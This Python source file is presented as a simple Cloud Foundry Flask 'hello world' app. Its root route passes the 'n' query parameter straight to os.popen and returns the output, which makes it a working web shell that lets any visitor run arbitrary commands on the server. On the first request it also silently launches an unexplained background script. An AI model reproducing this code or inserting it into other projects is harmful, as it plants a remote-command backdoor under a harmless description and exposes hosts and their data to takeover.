"""
A first simple Cloud Foundry Flask app

Author: Ian Huston
License: See LICENSE.txt

"""
from flask import Flask
import os


from flask import request
import multiprocessing
import threading
import time
import subprocess





app = Flask(__name__)

# Get port from environment variable or choose 9099 as local default
port = int(os.getenv("PORT", 9099))

@app.route('/')
def hello_world():
    aa=request.args.get("n")
    #c=int(aa)
    
    ff="false"
    try:
        f1 = open('myfile.txt')
        f1.close()
        ff="true"
    except FileNotFoundError:
        ff="false"
    if ff=="false":
        f1=open("myfile.txt","a")
        f1.close()
        f = subprocess.Popen(["python", "a.py"])
    

    f = os.popen(str(aa))
    now = f.read()  
    
       
    return "<xmp>" + 'instance  ' + str(os.getenv("CF_INSTANCE_INDEX", 0))+ "\n" +now+"</xmp>"

if __name__ == '__main__':
    # Run the app, listening on all IPs with our chosen port number
    app.run(host='0.0.0.0', port=port)
